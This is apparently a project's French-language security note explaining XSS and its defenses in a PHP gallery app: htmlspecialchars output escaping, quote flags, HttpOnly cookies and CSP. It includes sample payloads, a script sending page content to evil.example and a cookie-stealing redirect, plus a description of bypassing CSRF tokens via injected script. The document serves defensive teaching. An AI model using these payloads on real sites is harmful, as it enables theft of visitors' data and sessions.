# XSS

Une faille XSS survient quand une donnée fournie par un utilisateur (pseudo,
commentaire, e-mail…) est renvoyée dans une page sans échappement : le
navigateur d'un autre visiteur l'interprète comme du HTML ou du JavaScript.

Défense du projet : échappement à l'affichage, dans les vues, avec
`htmlspecialchars`. La donnée est stockée telle quelle et neutralisée à chaque
sortie.

## L'attaque sans échappement

Déroulé d'une XSS stockée, sur une version où un champ affiché n'est pas échappé
(ici un commentaire de la galerie) :

1. L'attaquant poste un « commentaire » qui contient du code au lieu de texte :

   ```html
   Super montage !<script>
     fetch('https://evil.example/vol?d=' + encodeURIComponent(document.body.innerHTML))
   </script>
   ```

2. Sans `htmlspecialchars`, le serveur stocke la chaîne telle quelle et la
   réinsère dans le HTML à chaque affichage de la galerie.

3. À l'ouverture de la galerie, le navigateur de la victime ne distingue pas ce
   script du code légitime : il l'exécute dans l'origine du site, avec la
   session de la victime.

4. Le script s'exécute ainsi chez chaque visiteur de la galerie. Dans cet
   exemple, il envoie le contenu de la page à `evil.example`.

Actions possibles pour le script injecté :

- exfiltration du contenu de la page (données privées, e-mail, jetons du DOM) ;
- action au nom de la victime : lecture du champ `csrf_token` présent dans la
  page et soumission d'un formulaire (`/photo/delete`, `/gallery/comment`). La
  protection CSRF est contournée : le script lit le jeton dans la page, depuis
  la même origine, sans enfreindre la same-origin policy ;
- redirection, défiguration, enregistrement des frappes.

Variante réfléchie : le code transite par un paramètre d'URL que la page
renvoie sans échappement ; la victime est amenée sur cette URL par un lien.

Vol du cookie : `<script>document.location='https://evil.example/?c='+document.cookie</script>`
transmettrait l'identifiant de session si le cookie était lisible par
JavaScript. Le cookie est `HttpOnly` (`Core/Session.php`) : `document.cookie`
ne le contient pas. Le script reste limité à l'exfiltration et aux actions au
nom de la victime, qui utilisent sa session tant qu'il s'exécute.

## Échappement en sortie

Toute valeur dynamique insérée dans le HTML passe par `htmlspecialchars` :

```php
<span><?= htmlspecialchars((string) $utilisateur['username']) ?></span>
```

`<`, `>`, `&` sont convertis en entités ; `<script>` s'affiche alors comme
texte.

## Dans un attribut HTML

Un attribut peut être délimité par un guillemet simple ou double ; les deux
doivent être échappés. Depuis PHP 8.1, les drapeaux par défaut de
`htmlspecialchars` sont `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401` : `"` et `'`
sont convertis sans argument supplémentaire. `ENT_QUOTES` écrit explicitement
donne le même résultat :

```php
<input value="<?= htmlspecialchars((string) $valeur, ENT_QUOTES) ?>">
```

Le risque apparaît avec un drapeau plus faible. Avec `ENT_COMPAT`, `'` n'est pas
échappé ; avec `ENT_NOQUOTES`, aucun guillemet ne l'est. Une valeur contenant le
guillemet délimiteur ferme alors l'attribut et permet d'en injecter d'autres
(`onmouseover=…`).

## Texte multi-ligne

Échapper avant de convertir les retours à la ligne, sinon le `<br>` ajouté est
lui-même échappé :

```php
<p><?= nl2br(htmlspecialchars((string) $commentaire['comment'])) ?></p>
```

## Contextes non couverts par `htmlspecialchars`

`htmlspecialchars` protège le corps HTML et les attributs. Il ne suffit pas
lorsqu'une donnée est insérée :

- dans un `<script>` (contexte JavaScript) ;
- dans une URL `href`/`src` (un `javascript:…` reste exécutable) ;
- dans un gestionnaire d'événement (`onclick=…`) ;
- dans du CSS en ligne.

Aucune donnée utilisateur n'est insérée dans ces contextes. Une URL fournie par
l'utilisateur est validée (schéma `http`/`https` uniquement) avant affichage.

## Points d'attention

- Échappement à la sortie uniquement. La base garde la valeur brute, et
  l'échappement dépend du contexte d'affichage. Échapper avant stockage altère
  la donnée et ne couvre pas les autres contextes.
- `charset=utf-8` est déclaré dans `layout.php` : un jeu de caractères ambigu
  peut contourner l'échappement.
- Content-Security-Policy posée par le vhost (`docker/web/000-default.conf`),
  en complément de l'échappement : un `<script>` injecté ne s'exécute pas,
  faute de `'unsafe-inline'`. En conséquence, les vues ne contiennent aucun
  script ni style inline ; le `onclick` de la déconnexion a été retiré et le
  formulaire porte un bouton. `style-src-attr 'unsafe-inline'` reste ouvert pour le seul
  attribut `style` du photomaton, dont la valeur vient de la configuration.
